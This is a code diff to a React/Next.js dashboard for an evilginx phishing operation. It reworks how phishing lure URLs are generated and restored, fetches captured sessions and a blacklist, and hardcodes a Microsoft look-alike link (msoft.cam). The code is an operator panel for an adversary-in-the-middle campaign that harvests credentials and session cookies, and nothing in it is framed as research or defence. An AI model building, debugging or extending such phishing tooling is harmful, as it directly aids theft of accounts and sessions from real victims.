@@ -1,4 +1,4 @@
-import { useEffect, useState, useCallback, useRef } from "react";
+import { useEffect, useState, useCallback } from "react";
 import Layout from "@/components/Layout";
 import StatsCard from "../components/StatsCard";
 import Image from "next/image";
@@ -57,7 +57,6 @@ export default function Dashboard() {
   const [lures, setLures] = useState<Lure[]>([]);
   const [selectedLure, setSelectedLure] = useState<Lure | null>(null);
   const [linkLoading, setLinkLoading] = useState(false);
-  const initialized = useRef(false);
 
   // Pagination state
   const [currentPage, setCurrentPage] = useState(1);
@@ -299,6 +298,11 @@ export default function Dashboard() {
     const lureIndex = Number(lureIndexStr);
     const selectedLure = lures[lureIndex];
 
+    if (!selectedLure) {
+      console.error("Invalid lure index:", lureIndex);
+      return;
+    }
+
     // Set loading state before fetching the URL
     setLinkLoading(true);
 
@@ -313,16 +317,20 @@ export default function Dashboard() {
 
     let gotValidUrl = false;
 
-    // Get the exact URL by calling the evilginx command through our API
+    // Get the exact URL by calling the evilginx command through our API - THIS RUNS THE EVILGINX COMMAND DIRECTLY
     try {
+      console.log(
+        "Fetching lure URL from evilginx command for index:",
+        lureIndex
+      );
       const lureUrlResponse = await fetch(
         `/api/lure-url?lureIndex=${lureIndex}`
       );
       if (lureUrlResponse.ok) {
         const data = await lureUrlResponse.json();
+        console.log("Received URL response:", data);
         if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
           setFullLink(data.url);
-          localStorage.setItem("fullLink", data.url);
           gotValidUrl = true;
         }
       }
@@ -333,14 +341,15 @@ export default function Dashboard() {
     // If first method failed, try the fallback method
     if (!gotValidUrl) {
       try {
+        console.log("Trying fallback API with lureId:", selectedLure.id);
         const linkResponse = await fetch(
           `/api/full-link?lureId=${selectedLure.id}`
         );
         if (linkResponse.ok) {
           const data = await linkResponse.json();
+          console.log("Received fallback response:", data);
           if (data.fullUrl) {
             setFullLink(data.fullUrl);
-            localStorage.setItem("fullLink", data.fullUrl);
             gotValidUrl = true;
           }
         }
@@ -354,8 +363,8 @@ export default function Dashboard() {
       const fallbackUrl = `${selectedLure.phishlet}.${
         selectedLure.hostname || window.location.hostname
       }${selectedLure.path}`;
+      console.log("Using constructed fallback URL:", fallbackUrl);
       setFullLink(fallbackUrl);
-      localStorage.setItem("fullLink", fallbackUrl);
     }
 
     // Always turn off loading regardless of success or failure
@@ -387,145 +396,107 @@ export default function Dashboard() {
     }
   };
 
-  // Separate useEffect just for initializing lure selection - will run on every mount
+  // Replace the useEffect that immediately sets fullLink from localStorage
   useEffect(() => {
-    const restoreLureSelection = async () => {
-      // Remove the initialized.current check to allow restoration on every mount
-      try {
-        console.log("Attempting to restore lure selection from localStorage");
+    const regenerateLink = async () => {
+      // Get saved lure ID from localStorage
+      const savedLureId = localStorage.getItem("selectedLureId");
+
+      if (savedLureId) {
+        console.log("Regenerating link for lureId:", savedLureId);
         setLinkLoading(true);
 
-        // First fetch all available lures
-        const luresResponse = await fetch("/api/lures");
-        if (!luresResponse.ok) {
-          throw new Error("Failed to fetch lures");
-        }
+        // Try to get lure index from the savedLureId
+        // We'll need to fetch lures first if they're not available yet
+        try {
+          // If lures aren't loaded yet, fetch them
+          let availableLures = lures;
+          if (lures.length === 0) {
+            const luresResponse = await fetch("/api/lures");
+            if (luresResponse.ok) {
+              const luresData = await luresResponse.json();
+              availableLures = luresData.lures || [];
+              // Update lures state to avoid needing to fetch again
+              setLures(availableLures);
+            }
+          }
 
-        const luresData = await luresResponse.json();
-        const availableLures = luresData.lures || [];
-
-        // Update lures state
-        setLures(availableLures);
-
-        // Get saved lure ID from localStorage
-        const savedLureId = localStorage.getItem("selectedLureId");
-        console.log("Found savedLureId in localStorage:", savedLureId);
-
-        // Get saved full link from localStorage, if available
-        const savedFullLink = localStorage.getItem("fullLink");
-        if (savedFullLink) {
-          console.log("Found saved fullLink in localStorage:", savedFullLink);
-          setFullLink(savedFullLink);
-        }
-
-        if (availableLures.length > 0 && savedLureId) {
-          // Find the saved lure in the available lures
-          const savedLure = availableLures.find(
+          const lureIndex = availableLures.findIndex(
             (lure) => lure.id === savedLureId
           );
 
-          if (savedLure) {
-            console.log("Found matching lure in available lures:", savedLure);
-            // Set the selected lure immediately
-            setSelectedLure(savedLure);
+          if (lureIndex >= 0) {
+            console.log("Found lure at index:", lureIndex);
 
-            // First try to get the URL from lure-url API
-            let gotValidUrl = false;
+            // First try the lure-url API which runs the evilginx command
             try {
-              const lureIndex = availableLures.findIndex(
-                (lure) => lure.id === savedLureId
+              const response = await fetch(
+                `/api/lure-url?lureIndex=${lureIndex}`
               );
-              if (lureIndex >= 0) {
-                const response = await fetch(
-                  `/api/lure-url?lureIndex=${lureIndex}`
-                );
-                if (response.ok) {
-                  const data = await response.json();
-                  if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
-                    console.log("Successfully fetched lure URL:", data.url);
-                    setFullLink(data.url);
-                    localStorage.setItem("fullLink", data.url);
-                    gotValidUrl = true;
-                  }
+              if (response.ok) {
+                const data = await response.json();
+                if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
+                  console.log("Successfully regenerated lure URL:", data.url);
+                  setFullLink(data.url);
+                  setLinkLoading(false);
+                  return; // Success - exit early
                 }
-              }
-
-              // If first method failed, try the fallback
-              if (!gotValidUrl) {
-                const linkResponse = await fetch(
-                  `/api/full-link?lureId=${savedLureId}`
-                );
-                if (linkResponse.ok) {
-                  const data = await linkResponse.json();
-                  if (
-                    data.fullUrl &&
-                    data.fullUrl !== "https://msoft.cam/wYyGBBeI"
-                  ) {
-                    console.log(
-                      "Successfully fetched fallback URL:",
-                      data.fullUrl
-                    );
-                    setFullLink(data.fullUrl);
-                    localStorage.setItem("fullLink", data.fullUrl);
-                    gotValidUrl = true;
-                  }
-                }
-              }
-
-              // If both API calls failed, create a fallback URL
-              if (!gotValidUrl) {
-                const fallbackUrl = `${savedLure.phishlet}.${
-                  savedLure.hostname || window.location.hostname
-                }${savedLure.path}`;
-                console.log("Using constructed fallback URL:", fallbackUrl);
-                setFullLink(fallbackUrl);
-                localStorage.setItem("fullLink", fallbackUrl);
               }
             } catch (error) {
-              console.error("Error restoring lure URL:", error);
-              // Create fallback URL on error
-              const fallbackUrl = `${savedLure.phishlet}.${
-                savedLure.hostname || window.location.hostname
-              }${savedLure.path}`;
-              setFullLink(fallbackUrl);
-              localStorage.setItem("fullLink", fallbackUrl);
+              console.error("Error using lure-url API:", error);
             }
 
-            // Mark as initialized after successful restoration
-            initialized.current = true;
+            // If first method failed, try the fallback
+            try {
+              const linkResponse = await fetch(
+                `/api/full-link?lureId=${savedLureId}`
+              );
+              if (linkResponse.ok) {
+                const data = await linkResponse.json();
+                if (
+                  data.fullUrl &&
+                  data.fullUrl !== "https://msoft.cam/wYyGBBeI"
+                ) {
+                  console.log(
+                    "Successfully regenerated fallback URL:",
+                    data.fullUrl
+                  );
+                  setFullLink(data.fullUrl);
+                  setLinkLoading(false);
+                  return; // Success - exit early
+                }
+              }
+            } catch (error) {
+              console.error("Error using fallback API:", error);
+            }
+
+            // If all API calls failed, we'll fallback to a constructed URL
+            // But need the lure details first
+            const selectedLure = availableLures.find(
+              (lure) => lure.id === savedLureId
+            );
+            if (selectedLure) {
+              const fallbackUrl = `${selectedLure.phishlet}.${
+                selectedLure.hostname || window.location.hostname
+              }${selectedLure.path}`;
+              console.log("Using constructed fallback URL:", fallbackUrl);
+              setFullLink(fallbackUrl);
+            }
           } else {
-            // If the saved lure ID doesn't match any available lures, clear it
-            console.log("Saved lure ID does not match any available lures");
-            localStorage.removeItem("selectedLureId");
+            console.log("Could not find lure with ID:", savedLureId);
           }
+        } catch (error) {
+          console.error("Error regenerating link:", error);
+        } finally {
+          setLinkLoading(false);
         }
-      } catch (error) {
-        console.error("Error in restoreLureSelection:", error);
-      } finally {
-        setLinkLoading(false);
       }
     };
 
-    // Always attempt to restore lure selection on mount
-    restoreLureSelection();
+    regenerateLink();
+  }, [lures]); // Only depends on lures to avoid re-running too often
 
-    // This useEffect only runs on mount
-  }, []);
-
-  // Add an effect that runs on mount to immediately load the full link from localStorage
-  useEffect(() => {
-    // Get saved full link from localStorage, if available
-    const savedFullLink = localStorage.getItem("fullLink");
-    if (savedFullLink) {
-      console.log(
-        "Immediately setting fullLink from localStorage:",
-        savedFullLink
-      );
-      setFullLink(savedFullLink);
-    }
-  }, []);
-
-  // Modify the original useEffect to not handle lure initialization
+  // Modify the original useEffect to better handle lure selection
   useEffect(() => {
     const fetchData = async () => {
       console.log("Starting data fetch...");
@@ -534,21 +505,48 @@ export default function Dashboard() {
 
       try {
         console.log("Fetching sessions and blacklist data...");
-        const [sessionsResponse, blacklistResponse] = await Promise.all([
-          fetch("/api/sessions"),
-          fetch("/api/blacklist"),
-        ]);
+        const [sessionsResponse, blacklistResponse, luresResponse] =
+          await Promise.all([
+            fetch("/api/sessions"),
+            fetch("/api/blacklist"),
+            fetch("/api/lures"),
+          ]);
 
-        if (!sessionsResponse.ok || !blacklistResponse.ok) {
+        if (
+          !sessionsResponse.ok ||
+          !blacklistResponse.ok ||
+          !luresResponse.ok
+        ) {
           console.error("Response not OK:", {
             sessions: sessionsResponse.status,
             blacklist: blacklistResponse.status,
+            lures: luresResponse.status,
           });
           const errorData = await sessionsResponse.json();
           throw new Error(errorData.message || "Failed to fetch data");
         }
 
         const sessionsData: Session[] = await sessionsResponse.json();
+        const blacklistData = await blacklistResponse.json();
+        const luresData = await luresResponse.json();
+        const availableLures = luresData.lures || [];
+
+        // Update lures while preserving the selected lure
+        setLures(availableLures);
+
+        // Restore selected lure if we have a saved ID
+        const savedLureId = localStorage.getItem("selectedLureId");
+        if (savedLureId && (!selectedLure || selectedLure.id !== savedLureId)) {
+          const savedLure = availableLures.find(
+            (lure) => lure.id === savedLureId
+          );
+          if (savedLure) {
+            console.log("Restoring selected lure from updated lures list");
+            setSelectedLure(savedLure);
+          }
+        }
+
+        // Continue with existing session processing...
         console.log("Received sessions data:", {
           count: sessionsData.length,
           sample: sessionsData.slice(0, 2).map((s) => ({
@@ -558,7 +556,6 @@ export default function Dashboard() {
           })),
         });
 
-        const blacklistData = await blacklistResponse.json();
         console.log("Received blacklist data:", {
           ipsCount: blacklistData.ips?.length,
         });
